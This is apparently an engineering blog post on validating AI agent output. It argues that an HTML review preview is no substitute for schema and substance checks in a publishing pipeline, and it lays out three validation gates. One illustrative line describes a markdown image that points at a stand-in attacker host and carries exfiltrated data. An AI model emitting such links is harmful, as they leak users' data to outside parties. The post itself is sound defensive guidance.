---
slug: html-review-not-replace-contract
title: "Review Agent Output With HTML, Don't Replace the Contract With It"
description: Rendering agent output as HTML is the right way to get a human to look — but the render surface is not the machine-enforced gate. Confusing the two lets schema violations, hallucinated values, and even in-output exfiltration reach your publish queue.
pubDatetime: 2026-06-16T00:00:00Z
tags: [structured-outputs, validation, llm-security, agent-pipelines]
series: Field Log
draft: false
references:
  - name: "OpenAI — Structured Outputs guide"
    url: https://developers.openai.com/api/docs/guides/structured-outputs
  - name: "OWASP — LLM05:2025 Improper Output Handling"
    url: https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/
  - name: "Anthropic — Tool Use overview"
    url: https://platform.claude.com/docs/en/docs/build-with-claude/tool-use/overview
---

Rendering agent output as HTML so a human can review it is good practice — until the rendered surface quietly becomes the validation contract. HTML is a *review surface*: it passes content through human eyes. It is not the *machine-enforced boundary* your downstream consumers depend on.

The moment "it looked fine on screen" stands in for a gate, schema violations, hallucinated values, and even in-output exfiltration flow straight into your publish daemon and WAL queue. Both boundaries are real. The bugs live in the gap between them.

## Two ways to confuse them

**Direction one: mistaking review for the contract.** The HTML preview looked OK, so you skip schema validation. But human eyes are a poor enforcement layer. They miss a missing `required` field, they don't catch a string where an integer should be, and they will not notice that a markdown image points at `https://evil.example/log?data=<exfiltrated>`. A preview that "looked fine" enqueues a row that violates every assumption the consumer holds.

**Direction two: mistaking the contract for review.** You wired up strict structured outputs, the JSON parses, every field is present and correctly typed — so you conclude no human needs to look. But strict mode validates *structure*, not *substance*.

OpenAI's Structured Outputs guide is explicit: constrained decoding means "the model cannot produce output that violates your schema." That guarantees shape, type, and enum validity. It says nothing about whether the value is *true*, *appropriate*, or *policy-compliant* — a hallucinated price or a fabricated citation is still perfectly valid JSON. The guide also reminds you that strict mode does not absolve you of handling refusals and `max_tokens`-truncated responses: the model "might not generate a valid response," and that case is yours to handle.

Anthropic's tool-use docs draw the same line. `strict: true` makes "Claude's tool calls always match your schema exactly." Yet the model can still *infer* a parameter you never supplied — Opus tends to re-ask, Sonnet tends to guess, and the docs state plainly that "this behavior is not guaranteed." The schema enforces the *form* of the call, not the *intent* behind the value.

## The render boundary is not the enforcement boundary

The HTML you show a human and the bytes you admit to your pipeline must travel different code paths, sealed by different mechanisms. This is the split most teams collapse.

OWASP names the surface failure directly. LLM05:2025, *Improper Output Handling*, says to "treat the model as any other user, adopting a zero-trust approach, and apply proper input validation on responses coming from the model to backend functions." If an agent emits markdown or JavaScript and your preview renders it raw, you have an XSS vector inside your own review tool — the screen you trusted becomes an injection sink. The mitigation is "context-aware output encoding based on where the LLM output will be used" plus a strict CSP. That seals the *render* boundary.

Be precise about what OWASP is and isn't saying. LLM05 is a **technical output-handling** category — encoding, XSS, downstream injection. It is not the accuracy category; OWASP keeps that distinct under Overreliance. Render safety and content trust are two different contracts, and sealing one tells you nothing about the other.

## What we actually run

In our multi-tenant publishing daemon, nothing reaches the WAL queue until it clears three gates in series — on a code path entirely separate from the preview.

```
agent output
  │
  ├─► render path:   context-aware encode + CSP  ──►  HTML preview (human eyes)
  │                                                    (NEVER an enqueue trigger)
  │
  └─► enforce path:
        gate 1  shape     strict schema / strict:true tool call  (form)
        gate 2  meaning   value ranges, policy, fact checks       (substance)
        gate 3  human     HTML review sign-off                    (judgment)
                                   │
                                   ▼
                          enqueue → WAL → publish
```

**Gate 1 is the form gate** — strict Structured Outputs or `strict: true` tool use. It is necessary and cheap, and it is *not sufficient*: it only proves shape.

**Gate 2 is the meaning gate** — the checks strict mode explicitly does not make. Is the number in range? Does the value satisfy policy? Does the citation resolve?

**Gate 3 is the human**, looking at the sealed HTML surface. The rule that keeps the two boundaries from collapsing: **the preview is never an enqueue trigger.** A human approving the render advances gate 3; it does not bypass gates 1 and 2, and the render path has no write access to the queue at all.

## The takeaway

Render your agent output as HTML — it is genuinely the best way to get a human to look. Just never let "it looked fine on screen" stand in for a machine-enforced gate, and never let "it passed the schema" stand in for a human looking.

Treat the output as another untrusted user: show it through an encoded, CSP-sealed surface, and admit it to your pipeline only through a contract that checks form *and* substance. Review and contract are both real boundaries — not the same one. The bugs live in the gap.